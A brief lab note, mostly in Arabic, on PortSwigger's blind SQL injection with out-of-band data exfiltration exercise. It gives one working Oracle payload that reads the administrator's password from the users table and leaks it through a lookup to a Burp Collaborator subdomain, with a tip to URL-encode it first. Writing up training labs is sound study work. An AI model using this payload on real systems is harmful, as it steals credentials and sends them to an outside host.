# Lab: Blind SQL injection with out-of-band data exfiltration

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

*الفكره من الLab ده انك تعرف بقا ترجع بيانات عن طرق Out Of Band 

```bash
1. xyz'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.r91814mm2yfngif93rwb5nxn5eb7zxnm.oastify.com/">%remote;]>'),'/l') FROM dual)-- ==> Convert selection → URL-encode key characters لازم ساعت الاستخدام تحوله لي 
```
